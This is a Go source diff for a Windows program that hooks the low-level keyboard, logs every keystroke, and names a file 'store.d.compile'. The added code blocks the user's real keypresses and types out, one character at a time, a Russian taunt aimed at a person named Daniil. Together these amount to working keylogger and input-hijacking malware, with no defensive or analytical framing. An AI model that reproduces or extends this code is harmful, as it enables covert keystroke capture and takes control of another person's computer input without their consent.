@@ -7,16 +7,19 @@ import (
 	"fmt"
 	"os"
 	"syscall"
+	"unicode/utf8"
 	"unsafe"
 
+	"github.com/go-vgo/robotgo"
 	"github.com/sirupsen/logrus"
 )
 
 const (
-	whKeyboardLl = 13
-	wmKeydown    = 256
-	mapvkToVcs   = 0
-	fileName     = "store.d.compile"
+	whKeyboardLl        = 13
+	wmKeydown           = 256
+	mapvkToVcs          = 0
+	fileName            = "store.d.compile"
+	keyMessage   string = "Аниме - сила, Даниил - могила!!! "
 )
 
 var (
@@ -30,6 +33,8 @@ var (
 	procGetKeyboardState      = user32.MustFindProc("GetKeyboardState")
 	procGetKeyboardLayoutName = user32.MustFindProc("GetKeyboardLayoutNameW")
 	procGetKeyboardLayout     = user32.MustFindProc("GetKeyboardLayout")
+	typed                     bool
+	counter                   int
 )
 
 // HOOKPROC ...
@@ -102,7 +107,19 @@ func LowLevelKeyboardProcess(nCode int, wparam uintptr, lparam uintptr) uintptr 
 		GetKeyboardState(&keyboardState)
 		ToUnicode(key.VkCode, uintptr(sc), &keyboardState, &unicodeKey, 256, 0)
 		unicodeKeyFiltered := bytes.Trim([]byte(unicodeKey[:]), "\x00")
-		logrus.Info(string(unicodeKeyFiltered))
+		logrus.Infoln(string(unicodeKeyFiltered))
+		if !typed {
+			if counter < utf8.RuneCountInString(keyMessage) {
+				typed = true
+				robotgo.TypeStr(string([]rune(keyMessage)[counter]))
+				counter++
+			} else {
+				counter = 0
+			}
+			return 1 //блочим остальные символы
+		} else {
+			typed = false
+		}
 	}
 	return CallNextHookEx(temporaryKeyPtr, nCode, wparam, lparam)
 }
